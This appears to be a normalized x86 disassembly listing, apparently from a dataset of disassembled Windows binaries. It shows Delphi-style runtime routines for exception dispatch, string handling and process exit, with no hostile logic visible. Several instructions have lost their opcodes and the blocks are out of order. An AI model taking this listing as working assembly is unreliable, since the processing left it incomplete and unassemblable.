push edx
push ecx
call sub_4035b4
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_403638
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_4030d4
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_405d64
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_4035a0
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_403550
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_403764
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_4030d4
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_403550
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_405d64
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_40358c
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402b28
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_4038ec
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_4035d4
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_403924
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403edc
sub_40394c
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_405d64
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_403198
call sub_403534
sub_4039a0
call sub_405d64
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_403198
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_4035fc
jmp edx
sub_4039e8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027e0
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403b48
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403b70
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403bb6
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403bd0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403c16
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403c70
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405af8
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403c94
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405af8
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403cbc
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403ce0
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403d3c
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403d6c
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_40123c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_401204
push eax
call sub_401224
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_401204
push eax
call sub_401224
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403df8
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403ce0
call sub_403d6c
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403b70
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403b48
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_4055c4
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403d3c
push eax
call sub_401254
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403ee8
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_4026fc
pop eax
sub_403f0c
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026fc
sub_403f3c
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_403fac
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028d8
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026fc
sub_403f80
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026fc
sub_403fac
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026dc
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_403fd8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_403fac
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_403ee8
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028d8
sub_404008
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_404028
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_404044
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_403ee8
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_404534
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404008
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_404008
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404534
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_403fd8
jmp r-xdata
sub_4040e0
xor ecx ecx
test edx edx
je r-xdata
jmp sub_403fd8
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_404110
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404044
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404158
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_403fd8
not ecx
sub_404184
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028d8
pop ebx
retn
mov ecx ebx
sub_4041b0
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_403f3c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_404534
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_404534
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028d8
pop edi
pop esi
pop ebx
retn
sub_4041f4
test edx edx
je r-xdata
mov edx ecx
jmp sub_403f3c
test ecx ecx
je sub_403f3c
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_4041b0
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_403fac
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028d8
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028d8
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_403f3c
pop edx
pop eax
jmp sub_4041b0
call sub_403f3c
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_404268
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_403fac
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_404534
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028d8
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_403f3c
dec [ edx - 0x8 ]
sub_4042f4
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_4043b4
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_403fac
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028d8
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_4026fc
sub_404408
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_403ee8
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_403fd8
jmp r-xdata
pop ebx
retn 0x4
sub_404448
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_4043b4#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028d8
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_404534
mov edi ecx
sub_404490
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_404534
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028d8
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028d8
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_4044ec
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_404534
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_403ee8
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_403fac
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_40271c
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028d8
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_4045e0
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_404604
test edx edx
je sub_4045c8
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_4045c8
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402838
retn
sub_404628
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_4045c8
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_404810
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404028
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_404028
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404810
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_4046b4
jmp r-xdata
sub_4046b4
test ecx ecx
je sub_4045c8
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402838
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_4046d8
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4046b4
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404740
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_4047c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_404734
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_4046b4
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_404810
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_4045b8
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4045a0
mov ebx eax
mov eax [ edi ]
call sub_404734
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028d8
mov eax esi
sub_404854
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404884
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404884
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
